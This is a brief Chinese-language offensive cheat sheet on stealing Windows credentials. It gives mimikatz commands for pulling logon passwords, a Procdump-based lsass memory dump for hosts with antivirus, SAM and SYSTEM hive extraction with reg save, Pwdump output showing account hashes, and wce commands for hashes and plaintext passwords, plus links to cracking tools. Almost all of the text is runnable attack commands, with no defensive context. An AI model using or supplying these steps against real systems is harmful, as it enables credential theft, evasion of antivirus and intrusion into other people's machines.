## windows获取密码

#### mimikatz
	无杀软情况下，直接获取
	mimikatz # privilege::debug  #提升权限
	mimikatz # sekurlsa::logonpasswords  #抓去密码

	有杀软情况下dump lsass内存文件
	Procdump工具下载地址
	https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump

	Procdump.exe -accepteula -ma lsass.exe lsass.dmp

	mimikatz.exe "sekurlsa::minidump lsass.dmp"

	sekurlsa::logonpasswords

#### 注册表获取密文
	reg save hklm\sam C:\sam.hive
	reg save hklm\system C:\system.hive

	cain 破解
	cracker --> add list --> import hashes from a sam database --> sam.hive

	破解密码
	https://objectif-securite.ch/en/ophcrack

#### Pwdump获取hash
	C:\Users\vlong\Desktop\Pwdump v7.13\Pwdump v7.13>"Pwdump v7.13.exe"
	Pwdump v7.1 - raw password extractor
	Author: Andres Tarasco Acuna
	url: http://www.514.es

	vlong:500:9F49D82623B96D33C93A85274007F52D:BD0E68A5B3FA7D344BD28B97925DBE36:::
	Guest:501:92F30DBF270A6C479960DC69A50A0603:75A59E287378B9CDE44597625D53A2C4:::
	:503:740D276EBA7664BF73859924503A668C:0F30222BBD94E382FDED22905 D5FAF03:::
	:504:DB8BCC934C4A0BB694F3DC85DCBD40ED:B04E7F2D48298CB8FBDD92F9E19A2432:::

	ophcrack破解密码
	下载ophcrack
	https://ophcrack.sourceforge.io/download.php?type=ophcrack
	下载表
	https://ophcrack.sourceforge.io/tables.php

#### wce获取hash
	wce -v -l   #获取密文需重启
	wce -w    #获取明文